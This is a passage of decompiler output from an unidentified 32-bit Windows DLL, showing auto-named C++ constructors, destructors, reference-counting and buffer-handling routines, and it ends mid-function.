  return (*(int (__thiscall **)(_DWORD *))(*this[4] + 20))(this[4]);
}

//----- (1002134B) --------------------------------------------------------
_DWORD *__stdcall sub_1002134B(_DWORD *a1, int a2, int a3)
{
  sub_1001B5F6((int)a1, a2, 0);
  a1[4] = a3;
  *a1 = &off_100742D4;
  sub_1000C28D((void *)0x1000, (int)(a1 + 5), 0);
  sub_1000C28D((void *)1, (int)(a1 + 10), 0);
  return a1;
}
// 100742D4: using guessed type int (__thiscall *off_100742D4)(void *Block, char);

//----- (100213A4) --------------------------------------------------------
void *__thiscall sub_100213A4(void *Block, char a2)
{
  sub_100213C3((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100213C3) --------------------------------------------------------
int __thiscall sub_100213C3(int this)
{
  *(_DWORD *)this = &off_100742D4;
  sub_1001B690((_BYTE *)this);
  sub_1000C45D((int *)(this + 40));
  sub_1000C45D((int *)(this + 20));
  return sub_1001B64E((_BYTE *)this);
}
// 100742D4: using guessed type int (__thiscall *off_100742D4)(void *Block, char);

//----- (10021427) --------------------------------------------------------
int __thiscall sub_10021427(char *this, char a2)
{
  char *v3; // edi

  v3 = this + 40;
  *(_BYTE *)sub_1000C55B((int)(this + 40), 0) = a2;
  return (*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 12))(this, v3);
}

//----- (1002144D) --------------------------------------------------------
unsigned int __thiscall sub_1002144D(int *this, int *a2)
{
  unsigned int result; // eax
  unsigned int v4; // ecx
  int v5; // ebx
  int v6; // eax
  int v7; // eax
  int v8[5]; // [esp+10h] [ebp-38h] BYREF
  int v9[5]; // [esp+24h] [ebp-24h] BYREF
  unsigned int v10; // [esp+38h] [ebp-10h]
  int v11; // [esp+44h] [ebp-4h]

  result = a2[3];
  v10 = 0;
  if ( result )
  {
    v4 = this[8];
    do
    {
      v5 = result - v10;
      if ( result - v10 >= v4 )
        v5 = v4;
      sub_1000C73C(v5, this + 5, (int)v9, 0);
      v11 = 0;
      v6 = sub_1000C709(v5, a2, (int)v8, v10);
      LOBYTE(v11) = 1;
      (*(void (__thiscall **)(int, int, int *))(*(_DWORD *)this[4] + 12))(this[4], v6, v9);
      LOBYTE(v11) = 0;
      sub_1000C45D(v8);
      v7 = (*(int (__thiscall **)(int *))(*this + 36))(this);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v7 + 12))(v7, v9);
      v11 = -1;
      sub_1000C45D(v9);
      v4 = this[8];
      v10 += v4;
      result = a2[3];
    }
    while ( v10 < result );
  }
  return result;
}
// 1002144D: using guessed type int var_24[5];
// 1002144D: using guessed type int var_38[5];

//----- (100214EA) --------------------------------------------------------
int __thiscall sub_100214EA(_DWORD **this, int a2, int a3)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax

  v4 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  v5 = ((int (__thiscall *)(_DWORD **))(*this)[9])(this);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 8))(v5, a2, a3);
  v6 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this[4] + 16))(this[4], v6 - v4);
}

//----- (10021524) --------------------------------------------------------
int __thiscall sub_10021524(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[4] + 20))(this[4]);
}

//----- (1002152C) --------------------------------------------------------
void __thiscall sub_1002152C(int *this)
{
  *this = (int)&off_10074310;
  sub_10009F65(this + 1);
}
// 10074310: using guessed type int (__thiscall *off_10074310)(void *Block, char);

//----- (10021553) --------------------------------------------------------
int *__thiscall sub_10021553(int *Block, char a2)
{
  sub_1002152C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10021572) --------------------------------------------------------
int *__stdcall sub_10021572(int *a1, void *a2, int a3, volatile LONG *lpAddend, int a5)
{
  int v5; // ebx
  volatile LONG *v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // ebx
  volatile LONG *v10; // ecx
  volatile LONG *v12; // [esp-8h] [ebp-4Ch] BYREF
  volatile LONG *v13; // [esp-4h] [ebp-48h]
  int v14[5]; // [esp+10h] [ebp-34h] BYREF
  int v15[7]; // [esp+24h] [ebp-20h] BYREF
  int v16; // [esp+40h] [ebp-4h]

  v16 = 0;
  sub_1002F1A2(a1, (int)a2);
  v5 = a3;
  a1[4] = a5;
  v6 = lpAddend;
  *a1 = (int)&off_10074304;
  a1[5] = 0;
  v13 = v6;
  a1[7] = (int)v6;
  a1[6] = v5;
  InterlockedIncrement(v13);
  LOBYTE(v16) = 2;
  sub_1000C3F3((_DWORD *)(v5 + 4), (int)v15);
  LOBYTE(v16) = 3;
  v7 = sub_1000C77C(v15, 4);
  v13 = 0;
  a1[8] = v7;
  v8 = sub_1000C77C(v15, (int)v13);
  v9 = v15[3];
  a1[9] = v8;
  sub_1000C709(v9 - 8, v15, (int)v14, 8);
  LOBYTE(v16) = 4;
  v13 = v10;
  v12 = v10;
  sub_1000989D(&v12);
  LOBYTE(v16) = 4;
  sub_1002F212(a1, (int)v12, (int)v13);
  LOBYTE(v16) = 3;
  sub_1000C45D(v14);
  LOBYTE(v16) = 2;
  sub_1000C45D(v15);
  v16 = -1;
  sub_1000DB4C((void **)&a3);
  return a1;
}
// 100215FA: variable 'v10' is possibly undefined
// 10074304: using guessed type int (__thiscall *off_10074304)(void *Block, char);
// 10021572: using guessed type int var_34[5];

//----- (10021648) --------------------------------------------------------
void *__thiscall sub_10021648(void *Block, char a2)
{
  sub_10021668((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10021668) --------------------------------------------------------
void __stdcall sub_10021668(int a1)
{
  sub_1000DB4C((void **)(a1 + 24));
  sub_1002152C((int *)a1);
}

//----- (10021697) --------------------------------------------------------
_DWORD *__stdcall sub_10021697(_DWORD *a1, int a2, int a3, int a4, void *Block, int a6)
{
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  void *v9; // ecx
  int *v11; // [esp-4h] [ebp-54h]
  _DWORD *v12; // [esp+0h] [ebp-50h] BYREF
  void *v13; // [esp+4h] [ebp-4Ch]
  int v14[5]; // [esp+18h] [ebp-38h] BYREF
  int v15[8]; // [esp+2Ch] [ebp-24h] BYREF
  int v16; // [esp+4Ch] [ebp-4h]

  v16 = 0;
  v15[5] = (int)&v12;
  sub_10009F32(&v12, (int)&a3);
  LOBYTE(v16) = 0;
  sub_1002F15C(a1, a2, (int)v12, (int)v13);
  LOBYTE(v16) = 2;
  v13 = 0;
  *a1 = &off_10074304;
  a1[4] = 0;
  a1[5] = 0;
  sub_1000DB0D(a1 + 6, (int)v13);
  LOBYTE(v16) = 3;
  v13 = 0;
  a1[9] = Block;
  sub_1000C28D((void *)8, (int)v15, v13);
  LOBYTE(v16) = 4;
  sub_1000C79D(v15, 0, a1[9]);
  sub_1000C79D(v15, 4, a1[8]);
  v6 = sub_10009952((int)(a1 + 1), v14);
  LOBYTE(v16) = 5;
  sub_1000C5DF(v6, (int)v15);
  LOBYTE(v16) = 4;
  sub_1000C45D(v14);
  v7 = operator new(0x20u);
  Block = v7;
  LOBYTE(v16) = 6;
  if ( v7 )
    v8 = sub_100244AF(v15, v7, 3);
  else
    v8 = 0;
  LOBYTE(v16) = 4;
  sub_1002199D((int)v8, (int)(a1 + 6));
  v13 = v9;
  v12 = v9;
  v13 = (void *)a1[7];
  v12 = (_DWORD *)a1[6];
  InterlockedIncrement((volatile LONG *)v13);
  LOBYTE(v16) = 7;
  v11 = *(int **)(a1[3] + 24);
  LOBYTE(v16) = 4;
  sub_10025457(v11, v12, (volatile LONG *)v13);
  sub_100217CC(a6, a1);
  LOBYTE(v16) = 3;
  sub_1000C45D(v15);
  v16 = -1;
  sub_10009F65(&a3);
  return a1;
}
// 1002176F: variable 'v9' is possibly undefined
// 10074304: using guessed type int (__thiscall *off_10074304)(void *Block, char);
// 10021697: using guessed type int var_38[5];

//----- (100217CC) --------------------------------------------------------
LONG __fastcall sub_100217CC(int a1, _DWORD *a2)
{
  volatile LONG *v4; // eax
  volatile LONG *v5; // ecx
  _DWORD *v6; // ecx
  int *v7; // edi
  int v9; // [esp-8h] [ebp-44h] BYREF
  volatile LONG *v10; // [esp-4h] [ebp-40h]
  int *v11; // [esp+14h] [ebp-28h]
  int v12[6]; // [esp+18h] [ebp-24h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  if ( a1 )
    *(_DWORD *)(a1 + 16) = a2;
  sub_1000C3F3((_DWORD *)(a2[6] + 4), (int)v12);
  v4 = 0;
  v13 = 0;
  a2[5] = a1;
  if ( a1 )
    v4 = *(volatile LONG **)(*(_DWORD *)(a1 + 24) + 28);
  if ( v4 != (volatile LONG *)a2[8] )
  {
    v10 = v4;
    v9 = 4;
    a2[8] = v4;
    sub_1000C79D(v12, v9, (int)v10);
    sub_1000C439(v12, a2[6] + 4);
    v10 = v5;
    v9 = (int)v5;
    v10 = (volatile LONG *)a2[7];
    v6 = (_DWORD *)a2[6];
    v11 = &v9;
    v9 = (int)v6;
    InterlockedIncrement(v10);
    LOBYTE(v13) = 1;
    v7 = *(int **)(a2[3] + 24);
    LOBYTE(v13) = 0;
    sub_10025332(v7, (_DWORD *)v9, v10);
  }
  v13 = -1;
  return sub_1000C45D(v12);
}
// 10021849: variable 'v5' is possibly undefined
// 100217CC: using guessed type int var_24[6];

//----- (1002189D) --------------------------------------------------------
LONG __thiscall sub_1002189D(_DWORD *this, int Src)
{
  int v3; // eax
  int *v4; // edi
  _DWORD *v6; // [esp-8h] [ebp-3Ch]
  volatile LONG *v7; // [esp-4h] [ebp-38h]
  int v8[7]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_1000C3F3((_DWORD *)(this[6] + 4), (int)v8);
  v9 = 0;
  if ( sub_1000C77C(v8, 0) != Src )
  {
    sub_1000C79D(v8, 0, Src);
    v3 = this[6];
    this[9] = Src;
    sub_1000C439(v8, v3 + 4);
    v7 = (volatile LONG *)this[7];
    v6 = (_DWORD *)this[6];
    InterlockedIncrement(v7);
    LOBYTE(v9) = 1;
    v4 = *(int **)(this[3] + 24);
    LOBYTE(v9) = 0;
    sub_10025332(v4, v6, v7);
  }
  v9 = -1;
  return sub_1000C45D(v8);
}
// 1002189D: using guessed type int var_20[7];
// 1002189D: using guessed type int Src;

//----- (1002192E) --------------------------------------------------------
int __thiscall sub_1002192E(int this)
{
  _DWORD *v2; // edx

  v2 = *(_DWORD **)(this + 16);
  if ( v2 )
    sub_100217CC(*(_DWORD *)(this + 20), v2);
  else
    sub_10021FDD(*(_DWORD **)(this + 12), *(_DWORD *)(this + 20));
  sub_100253E7(*(int **)(*(_DWORD *)(this + 12) + 24), *(_DWORD *)(*(_DWORD *)(this + 24) + 28));
  sub_100253E7(*(int **)(*(_DWORD *)(this + 12) + 24), *(_DWORD *)(this + 36));
  return 1;
}

//----- (1002198A) --------------------------------------------------------
int sub_1002198A()
{
  return 1;
}

//----- (1002199D) --------------------------------------------------------
void __usercall sub_1002199D(int a1@<edi>, int a2@<esi>)
{
  _DWORD *v2; // eax

  if ( *(_DWORD *)a2 != a1 )
  {
    sub_1000DCE6((void **)a2);
    v2 = operator new(4u);
    if ( v2 )
      *v2 = 1;
    else
      v2 = 0;
    *(_DWORD *)(a2 + 4) = v2;
    *(_DWORD *)a2 = a1;
  }
}

//----- (100219E0) --------------------------------------------------------
void __thiscall sub_100219E0(_DWORD *this)
{
  *this = &off_10073380;
  *this = &off_10073904;
}
// 10073380: using guessed type int (__thiscall *off_10073380)(void *Block, char);
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);

//----- (10021A05) --------------------------------------------------------
void __thiscall sub_10021A05(_DWORD *this, int a2, volatile LONG *lpAddend)
{
  _DWORD *v3; // esi
  int v4; // ebx
  int v5; // eax
  int v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  void (__thiscall **v9)(int, volatile LONG *, volatile LONG *); // eax
  int v10; // edx
  void (__thiscall **v11)(_DWORD *, int *); // eax
  _BYTE v12[8]; // [esp-18h] [ebp-78h] BYREF
  _DWORD *v13; // [esp-10h] [ebp-70h] BYREF
  volatile LONG *p_Addend; // [esp-Ch] [ebp-6Ch]
  volatile LONG *v15; // [esp-8h] [ebp-68h] BYREF
  volatile LONG *v16; // [esp-4h] [ebp-64h]
  int v17; // [esp+10h] [ebp-50h] BYREF
  unsigned int v18; // [esp+14h] [ebp-4Ch]
  int v19[2]; // [esp+20h] [ebp-40h] BYREF
  int v20; // [esp+28h] [ebp-38h] BYREF
  volatile LONG *v21; // [esp+2Ch] [ebp-34h]
  int v22[2]; // [esp+30h] [ebp-30h] BYREF
  void *v23; // [esp+38h] [ebp-28h]
  void *v24; // [esp+3Ch] [ebp-24h]
  unsigned int i; // [esp+40h] [ebp-20h]
  _DWORD *v26; // [esp+44h] [ebp-1Ch]
  void *Block; // [esp+48h] [ebp-18h]
  LONG Addend; // [esp+4Ch] [ebp-14h] BYREF
  unsigned int v29; // [esp+50h] [ebp-10h]
  int v30; // [esp+5Ch] [ebp-4h]

  v3 = this;
  v26 = this;
  v30 = 0;
  sub_10009D2C(&v20, &word_1008E860);
  LOBYTE(v30) = 1;
  v4 = a2;
  (*(void (__thiscall **)(int, int *, int *))(*(_DWORD *)a2 + 96))(a2, &v17, &v20);
  LOBYTE(v30) = 3;
  sub_10009F65(&v20);
  v29 = 0;
  for ( i = v18; v29 < i; ++v29 )
  {
    v5 = (*(int (__thiscall **)(int *, unsigned int))(v17 + 44))(&v17, v29);
    sub_10009F32(v22, v5);
    LOBYTE(v30) = 4;
    v6 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v4 + 84))(v4, v22);
    if ( v6 >= 4 )
    {
      if ( v6 <= 10 )
      {
        v10 = *(_DWORD *)v4;
        v16 = (volatile LONG *)v6;
        v23 = v12;
        (*(void (__thiscall **)(int, _BYTE *, int *, int))(v10 + 68))(v4, v12, v22, v6);
        LOBYTE(v30) = 14;
        v11 = (void (__thiscall **)(_DWORD *, int *))(*v3 + 44);
        LOBYTE(v30) = 4;
        (*v11)(v3, v22);
      }
      else if ( v6 == 11 )
      {
        Addend = 1;
        Block = operator new(0x24u);
        LOBYTE(v30) = 5;
        if ( Block )
        {
          v15 = v16;
          v24 = &v15;
          sub_10009F32(&v15, (int)v22);
          LOBYTE(v30) = 6;
          p_Addend = &Addend;
          v13 = v3;
          v23 = &v13;
          InterlockedIncrement(&Addend);
          LOBYTE(v30) = 5;
          v7 = sub_1002F259(Block, (int)v13, p_Addend, (int)v15, (int)v16);
        }
        else
        {
          v7 = 0;
        }
        LOBYTE(v30) = 4;
        sub_100028DE(v19, (int)v7);
        LOBYTE(v30) = 8;
        Block = operator new(0x24u);
        LOBYTE(v30) = 9;
        if ( Block )
        {
          v15 = v16;
          v23 = &v15;
          sub_10009F32(&v15, (int)v22);
          LOBYTE(v30) = 10;
          v24 = &v13;
          p_Addend = lpAddend;
          v13 = (_DWORD *)v4;
          InterlockedIncrement(lpAddend);
          LOBYTE(v30) = 9;
          v8 = sub_1002F259(Block, (int)v13, p_Addend, (int)v15, (int)v16);
        }
        else
        {
          v8 = 0;
        }
        LOBYTE(v30) = 8;
        sub_100028DE(&v20, (int)v8);
        LOBYTE(v30) = 12;
        v23 = &v15;
        v16 = v21;
        v15 = (volatile LONG *)v20;
        InterlockedIncrement(v21);
        LOBYTE(v30) = 13;
        v9 = (void (__thiscall **)(int, volatile LONG *, volatile LONG *))(*(_DWORD *)v19[0] + 16);
        LOBYTE(v30) = 12;
        (*v9)(v19[0], v15, v16);
        LOBYTE(v30) = 8;
        sub_10002922(&v20);
        LOBYTE(v30) = 4;
        sub_10002922(v19);
        v3 = v26;
      }
    }
    LOBYTE(v30) = 3;
    sub_10009F65(v22);
  }
  LOBYTE(v30) = 0;
  sub_100022C5(&v17);
  v30 = -1;
  sub_10002922(&a2);
}

//----- (10021C24) --------------------------------------------------------
int *__cdecl sub_10021C24(int *a1, void *a2)
{
  _DWORD *v2; // eax
  int v3; // eax
  unsigned int v4; // esi
  int *v5; // ebx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // edx
  void *v10; // [esp-10h] [ebp-80h]
  int v11; // [esp-Ch] [ebp-7Ch] BYREF
  volatile LONG *v12; // [esp-8h] [ebp-78h] BYREF
  volatile LONG *v13; // [esp-4h] [ebp-74h]
  int v14[5]; // [esp+10h] [ebp-60h] BYREF
  int v15[2]; // [esp+24h] [ebp-4Ch] BYREF
  _DWORD v16[2]; // [esp+2Ch] [ebp-44h] BYREF
  int v17[2]; // [esp+34h] [ebp-3Ch] BYREF
  int v18; // [esp+3Ch] [ebp-34h] BYREF
  volatile LONG *v19; // [esp+40h] [ebp-30h]
  volatile LONG *v20; // [esp+44h] [ebp-2Ch] BYREF
  volatile LONG *v21; // [esp+48h] [ebp-28h]
  int v22[3]; // [esp+4Ch] [ebp-24h] BYREF
  void *v23; // [esp+58h] [ebp-18h]
  int v24; // [esp+5Ch] [ebp-14h]
  void *Block; // [esp+60h] [ebp-10h]
  int v26; // [esp+6Ch] [ebp-4h]

  v26 = 0;
  v24 = 0;
  sub_10024E40((int)a2, &v20, 0x1Au);
  v26 = 1;
  Block = operator new(0x1Cu);
  LOBYTE(v26) = 2;
  if ( Block )
  {
    v13 = v21;
    v23 = &v12;
    v12 = v20;
    InterlockedIncrement(v21);
    LOBYTE(v26) = 2;
    v2 = sub_10021EFD(Block, a2, (int)v12, v13);
  }
  else
  {
    v2 = 0;
  }
  LOBYTE(v26) = 1;
  sub_1000DC03(a1, (int)v2);
  v24 = 1;
  sub_1000C3F3((_DWORD *)v20 + 1, (int)v14);
  LOBYTE(v26) = 4;
  v3 = sub_1000C77C(v14, 0);
  Block = 0;
  v4 = v3;
  while ( v4 )
  {
    sub_10024E40((int)a2, &v18, v4);
    LOBYTE(v26) = 5;
    v23 = operator new(0x28u);
    LOBYTE(v26) = 6;
    if ( v23 )
    {
      v13 = (volatile LONG *)Block;
      v12 = v19;
      v22[2] = (int)&v11;
      v11 = v18;
      InterlockedIncrement(v19);
      LOBYTE(v26) = 7;
      v10 = (void *)*a1;
      LOBYTE(v26) = 6;
      v5 = sub_10021572((int *)v23, v10, v11, v12, (int)v13);
    }
    else
    {
      v5 = 0;
    }
    LOBYTE(v26) = 5;
    sub_1002229A(v22, (int)v5);
    LOBYTE(v26) = 8;
    v6 = sub_1002F1DD(v22[0], v15);
    LOBYTE(v26) = 9;
    sub_1000BA21(v17, (int)v6);
    LOBYTE(v26) = 10;
    v7 = sub_10021FA0(*a1, v16);
    LOBYTE(v26) = 11;
    sub_10022743((_DWORD *)*v7, (int)v17, v22, 0);
    LOBYTE(v26) = 10;
    sub_1000DBA8(v16);
    LOBYTE(v26) = 9;
    sub_1000BA51(v17);
    LOBYTE(v26) = 8;
    sub_10009F65(v15);
    v8 = Block;
    ++*(_DWORD *)*a1;
    if ( v8 )
      sub_100217CC((int)v5, v8);
    else
      sub_10021FDD((_DWORD *)*a1, (int)v5);
    v4 = *(_DWORD *)(v22[0] + 32);
    Block = v5;
    LOBYTE(v26) = 5;
    sub_1000DC9E(v22);
    LOBYTE(v26) = 4;
    sub_1000DB4C((void **)&v18);
  }
  LOBYTE(v26) = 1;
  sub_1000C45D(v14);
  LOBYTE(v26) = 0;
  sub_1000DB4C((void **)&v20);
  return a1;
}
// 10021C24: using guessed type int var_60[5];
// 10021C24: using guessed type _DWORD var_44[2];

//----- (10021E01) --------------------------------------------------------
_DWORD *__cdecl sub_10021E01(_DWORD *a1, int *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  volatile LONG *v4; // esi
  _DWORD *v5; // ebx
  _DWORD *v6; // eax
  _DWORD *v8; // [esp-8h] [ebp-4Ch] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-48h]
  int v10[5]; // [esp+10h] [ebp-34h] BYREF
  _DWORD *v11; // [esp+24h] [ebp-20h] BYREF
  volatile LONG *lpAddend; // [esp+28h] [ebp-1Ch]
  _DWORD **v13; // [esp+2Ch] [ebp-18h]
  int v14; // [esp+30h] [ebp-14h]
  void *Block; // [esp+34h] [ebp-10h]
  int v16; // [esp+40h] [ebp-4h]

  v14 = 0;
  sub_1000C28D((void *)4, (int)v10, 0);
  v16 = 1;
  sub_1000C79D(v10, 0, 0);
  v2 = operator new(0x20u);
  Block = v2;
  LOBYTE(v16) = 2;
  if ( v2 )
    v3 = sub_100244AF(v10, v2, 2);
  else
    v3 = 0;
  LOBYTE(v16) = 1;
  sub_1000DB0D(&v11, (int)v3);
  LOBYTE(v16) = 3;
  v4 = lpAddend;
  v5 = v11;
  Block = &v8;
  v9 = lpAddend;
  v8 = v11;
  InterlockedIncrement(lpAddend);
  LOBYTE(v16) = 3;
  sub_10025457(a2, v8, v9);
  Block = operator new(0x1Cu);
  LOBYTE(v16) = 5;
  if ( Block )
  {
    v13 = &v8;
    v9 = v4;
    v8 = v5;
    InterlockedIncrement(v4);
    LOBYTE(v16) = 5;
    v6 = sub_10021EFD(Block, a2, (int)v8, v9);
  }
  else
  {
    v6 = 0;
  }
  LOBYTE(v16) = 3;
  sub_1000DC03(a1, (int)v6);
  v14 = 1;
  LOBYTE(v16) = 1;
  sub_1000DB4C((void **)&v11);
  LOBYTE(v16) = 0;
  sub_1000C45D(v10);
  return a1;
}
// 10021E01: using guessed type int var_34[5];

//----- (10021EFD) --------------------------------------------------------
_DWORD *__stdcall sub_10021EFD(_DWORD *a1, void *Block, int a3, volatile LONG *lpAddend)
{
  _DWORD *v4; // edi
  volatile LONG *v5; // eax
  int v6; // ecx
  volatile LONG *v8; // [esp-8h] [ebp-28h] BYREF
  int v9; // [esp-4h] [ebp-24h]
  void *v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+1Ch] [ebp-4h]
  _DWORD *Blocka; // [esp+2Ch] [ebp+Ch]

  v4 = 0;
  v11 = 0;
  v5 = lpAddend;
  v6 = a3;
  *a1 = 0;
  v9 = (int)v5;
  a1[2] = v5;
  a1[1] = v6;
  InterlockedIncrement((volatile LONG *)v9);
  sub_10022222(a1 + 3);
  v9 = 52;
  a1[5] = 0;
  a1[6] = Block;
  Blocka = operator new(v9);
  LOBYTE(v11) = 3;
  if ( Blocka )
  {
    v8 = (volatile LONG *)v9;
    v10 = &v8;
    sub_10009F32(&v8, (int)&unk_100955D0);
    LOBYTE(v11) = 3;
    v4 = sub_10022338(Blocka, (int)a1, (int)v8, v9);
  }
  LOBYTE(v11) = 2;
  sub_100222D9(a1 + 3, (int)v4);
  v11 = -1;
  sub_1000DB4C((void **)&a3);
  return a1;
}

//----- (10021FA0) --------------------------------------------------------
_DWORD *__stdcall sub_10021FA0(int a1, _DWORD *a2)
{
  volatile LONG *v2; // ecx

  v2 = *(volatile LONG **)(a1 + 16);
  a2[1] = v2;
  *a2 = *(_DWORD *)(a1 + 12);
  InterlockedIncrement(v2);
  return a2;
}

//----- (10021FDD) --------------------------------------------------------
LONG __thiscall sub_10021FDD(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  volatile LONG *v5; // ecx
  volatile LONG *v6; // ecx
  int *v7; // edi
  volatile LONG *v9; // [esp-8h] [ebp-44h] BYREF
  volatile LONG *v10; // [esp-4h] [ebp-40h]
  volatile LONG **v11; // [esp+14h] [ebp-28h]
  int v12[6]; // [esp+18h] [ebp-24h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  v3 = 0;
  this[5] = a2;
  if ( a2 )
    *(_DWORD *)(a2 + 16) = 0;
  v4 = this[5];
  if ( v4 )
    v3 = *(_DWORD *)(*(_DWORD *)(v4 + 24) + 28);
  sub_1000C3F3((_DWORD *)(this[1] + 4), (int)v12);
  v13 = 0;
  sub_1000C79D(v12, 0, v3);
  sub_1000C439(v12, this[1] + 4);
  v10 = v5;
  v9 = v5;
  v10 = (volatile LONG *)this[2];
  v6 = (volatile LONG *)this[1];
  v11 = &v9;
  v9 = v6;
  InterlockedIncrement(v10);
  LOBYTE(v13) = 1;
  v7 = (int *)this[6];
  LOBYTE(v13) = 0;
  sub_10025332(v7, v9, v10);
  v13 = -1;
  return sub_1000C45D(v12);
}
// 10022057: variable 'v5' is possibly undefined
// 10021FDD: using guessed type int var_24[6];

//----- (100220AA) --------------------------------------------------------
int *__thiscall sub_100220AA(_DWORD *this, int *a2, int a3, int a4, int *a5)
{
  void *v6; // eax
  int v7; // ecx
  _DWORD *v8; // eax
  int v10; // [esp-10h] [ebp-44h] BYREF
  int v11; // [esp-Ch] [ebp-40h]
  int *v12; // [esp-8h] [ebp-3Ch]
  int v13; // [esp-4h] [ebp-38h]
  _DWORD v14[2]; // [esp+10h] [ebp-24h] BYREF
  int v15; // [esp+18h] [ebp-1Ch]
  int v16; // [esp+1Ch] [ebp-18h] BYREF
  void *Block; // [esp+20h] [ebp-14h]
  int v18; // [esp+30h] [ebp-4h]

  v15 = 0;
  v18 = 2;
  v6 = operator new(0x28u);
  v7 = v13;
  Block = v6;
  if ( v6 )
  {
    v13 = this[5];
    v12 = a5;
    v11 = v7;
    v10 = v7;
    a5 = &v10;
    sub_10009F32(&v10, (int)&a3);
    LOBYTE(v18) = 2;
    a5 = sub_10021697(Block, (int)this, v10, v11, v12, v13);
  }
  else
  {
    a5 = 0;
  }
  LOBYTE(v18) = 1;
  sub_1002229A(a2, (int)a5);
  v15 = 1;
  LOBYTE(v18) = 4;
  sub_1000BA21(&v16, (int)&a3);
  LOBYTE(v18) = 5;
  v8 = sub_10021FA0((int)this, v14);
  LOBYTE(v18) = 6;
  sub_10022743((_DWORD *)*v8, (int)&v16, a2, 0);
  LOBYTE(v18) = 5;
  sub_1000DBA8(v14);
  LOBYTE(v18) = 4;
  sub_1000BA51(&v16);
  v18 = 1;
  sub_10021FDD(this, (int)a5);
  ++*this;
  LOBYTE(v18) = 0;
  sub_10009F65(&a3);
  return a2;
}
// 100220AA: using guessed type _DWORD var_24[2];

//----- (1002219E) --------------------------------------------------------
void __userpurge sub_1002219E(int a1@<esi>, int a2, int a3)
{
  int v3; // edi
  int pExceptionObject[5]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v5 = 0;
  if ( sub_1000A1C0((int)&unk_100955D0, (int)&a2) )
  {
    sub_1000BA21(pExceptionObject, (int)&a2);
    LOBYTE(v5) = 1;
    v3 = sub_10022A4A(*(_DWORD **)(a1 + 12), (int)pExceptionObject, 0);
    LOBYTE(v5) = 0;
    sub_1000BA51(pExceptionObject);
  }
  else
  {
    v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 12) + 4))(*(_DWORD *)(a1 + 12));
  }
  *(_DWORD *)a1 -= v3;
  v5 = -1;
  sub_10009F65(&a2);
}

//----- (10022222) --------------------------------------------------------
_DWORD *__usercall sub_10022222@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (1002229A) --------------------------------------------------------
_DWORD *__userpurge sub_1002229A@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100222D9) --------------------------------------------------------
void __usercall sub_100222D9(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_1000DD24((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (10022338) --------------------------------------------------------
_DWORD *__stdcall sub_10022338(_DWORD *a1, int a2, int a3, int a4)
{
  int v5; // [esp+0h] [ebp-28h] BYREF
  _DWORD *v6; // [esp+4h] [ebp-24h]
  void *v7; // [esp+18h] [ebp-10h]
  int v8; // [esp+24h] [ebp-4h]

  v8 = 0;
  v7 = &v5;
  sub_10009F32(&v5, (int)&a3);
  LOBYTE(v8) = 0;
  sub_1002F15C(a1, a2, v5, (int)v6);
  LOBYTE(v8) = 2;
  v6 = a1 + 4;
  *a1 = &off_1007431C;
  sub_10023C7D(v6);
  v8 = -1;
  sub_10009F65(&a3);
  return a1;
}
// 1007431C: using guessed type int (__thiscall *off_1007431C)(void *Block, char);

//----- (10022396) --------------------------------------------------------
int *__thiscall sub_10022396(int *Block, char a2)
{
  sub_100223B6(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100223B6) --------------------------------------------------------
void __stdcall sub_100223B6(int *a1)
{
  sub_10023CC2(a1 + 4);
  sub_1002152C(a1);
}

//----- (100223E4) --------------------------------------------------------
_DWORD *__stdcall sub_100223E4(_DWORD *a1, _DWORD *a2, int a3, int a4)
{
  int *v4; // eax
  _DWORD v6[2]; // [esp+10h] [ebp-28h] BYREF
  int v7[2]; // [esp+18h] [ebp-20h] BYREF
  int v8[2]; // [esp+20h] [ebp-18h] BYREF
  int v9; // [esp+28h] [ebp-10h]
  int v10; // [esp+34h] [ebp-4h]

  v9 = 0;
  v10 = 1;
  sub_1000BA21(v8, (int)&a3);
  LOBYTE(v10) = 2;
  sub_10022222(v6);
  LOBYTE(v10) = 3;
  v4 = sub_10022507(a1, v7, (int)v8, 2, 0);
  LOBYTE(v10) = 4;
  sub_10023F0B(v4, a2);
  v9 = 1;
  LOBYTE(v10) = 3;
  sub_100027E6(v7);
  LOBYTE(v10) = 2;
  sub_1000DBA8(v6);
